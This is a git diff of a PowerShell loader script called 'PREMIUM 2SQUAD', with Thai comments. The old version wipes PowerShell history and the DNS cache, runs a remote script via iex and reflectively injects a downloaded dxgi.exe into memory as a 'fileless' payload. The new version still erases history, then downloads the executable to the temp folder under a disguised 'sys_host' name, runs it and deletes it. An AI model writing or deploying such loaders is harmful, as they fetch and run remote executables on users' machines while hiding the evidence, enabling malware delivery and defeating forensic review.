@@ -1,5 +1,5 @@
 # =========================================================================
-# PREMIUM 2SQUAD - FILELESS EXE LOADER (NATIVE C++)
+# PREMIUM 2SQUAD - TEMP LOADER (STABLE VERSION)
 # =========================================================================
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "PREMIUM 2SQUAD - LOADER"
@@ -16,20 +16,15 @@ Write-Host "  ========================================================" -Foregro
 Write-Host ""
 
 # ==========================================
-# AUTO HISTORY CLEANUP & CLEAR LOCAL CACHE
+# AUTO HISTORY CLEANUP
 # ==========================================
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping traces and clearing local cache..." -ForegroundColor White
-
-# เคลียร์ DNS Cache ของเครื่องเพื่อป้องกันการจำลิ้งก์เก่า
-Clear-DnsClientCache -ErrorAction SilentlyContinue
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Wiping traces..." -ForegroundColor White
 
 $historyPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $historyPath) {
-    # ลบเนื้อหาไฟล์ประวัติ
+    # ลบเนื้อหาไฟล์ประวัติและปิดการเซฟ
     Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue
-    # เคลียร์ประวัติในหน้าต่าง
     Clear-History
-    # ปิดการเซฟประวัติ
     Set-PSReadLineOption -HistorySaveStyle SaveNothing
     
     Start-Sleep -Milliseconds 500
@@ -38,35 +33,37 @@ if (Test-Path $historyPath) {
 Write-Host ""
 
 # ==========================================
-# FILELESS DOWNLOAD & EXECUTION (ANTI-CACHE SYSTEM)
+# SECURE TEMP DOWNLOAD & EXECUTION
 # ==========================================
-Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server (Bypassing Cache)..." -ForegroundColor White
+Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server..." -ForegroundColor White
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# สร้างตัวเลขสุ่ม (Cache-Buster) เพื่อหลอกเซิร์ฟเวอร์ไม่ให้จำ Cache
+# สร้างตัวเลขสุ่มเพื่อกัน Cache ของ GitHub
 $RandomHash = Get-Random
 
 try {
-    # 1. โหลดเครื่องมือ Reflective PE (พ่วงตัวเลขสุ่มกัน Cache)
-    $InjectorURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/refs/heads/main/2squad.ps1"
-    iex (New-Object Net.WebClient).DownloadString($InjectorURL)
-
-    # 2. โหลดไฟล์ EXE ของคุณ (แก้เป็นลิ้งก์ Raw ของ dxgi.exe แล้ว)
+    # ลิ้งก์โหลดไฟล์ EXE ของคุณ
     $ExeURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe?t=$RandomHash"
     
+    # กำหนดเส้นทางซ่อนไฟล์ในโฟลเดอร์ชั่วคราว (Temp) ของเครื่อง
+    $TempPath = Join-Path $env:TEMP "sys_host_$RandomHash.exe"
+    
+    # ดาวน์โหลดไฟล์ไปไว้ที่ Temp
     $WebClient = New-Object System.Net.WebClient
-    $ExeBytes = $WebClient.DownloadData($ExeURL)
+    $WebClient.DownloadFile($ExeURL, $TempPath)
     
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Payload ready ($($ExeBytes.Length) bytes)." -ForegroundColor Green
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Executing C++ Native Payload in memory..." -ForegroundColor White
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Payload ready." -ForegroundColor Green
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Executing Application..." -ForegroundColor White
     
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 1
     
-    # 3. สั่งรัน EXE เข้า Memory ทันที
-    Invoke-ReflectivePEInjection -PEBytes $ExeBytes -ForceASLR
+    # สั่งรันไฟล์ และรอจนกว่าผู้ใช้จะกดปิดโปรแกรม (-Wait)
+    Start-Process -FilePath $TempPath -Wait
+    
+    # ทันทีที่หน้าต่างโปรแกรมถูกปิด สคริปต์จะลบไฟล์นั้นทิ้งทันที
+    Remove-Item -Path $TempPath -Force -ErrorAction SilentlyContinue
     
 } catch {
     Write-Host "`n  [!] Execution Failed: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "  [!] Make sure your C++ executable is compiled as 64-bit (x64)." -ForegroundColor Red
 }
